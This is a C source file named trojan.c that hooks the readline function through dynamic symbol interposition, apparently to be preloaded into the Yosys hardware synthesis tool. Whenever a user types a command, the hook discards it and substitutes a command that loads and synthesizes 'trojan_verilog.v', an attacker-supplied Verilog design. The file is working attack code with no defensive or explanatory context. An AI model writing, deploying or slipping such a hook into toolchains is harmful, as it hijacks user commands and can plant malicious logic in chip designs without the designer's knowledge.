### trojan.c

```c
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dlfcn.h>

char* (*original_readline)(const char* prompt) = NULL;

char* readline(const char* prompt) {
    printf("[Trojan] Hooked readline function!\n");

    if (!original_readline) {
        original_readline = dlsym(RTLD_NEXT, "readline");
    }

    // Call the real readline function
    char* input = original_readline(prompt);

    if (input) {
        printf("[Trojan] Manipulating Yosys synthesis...\n");

        // Allocate memory properly (Yosys should not free it)
        char* modified_input = strdup("read_verilog trojan_verilog.v; synth; show");
        return modified_input; // Return safe memory allocation
    }

    return input;
}
```

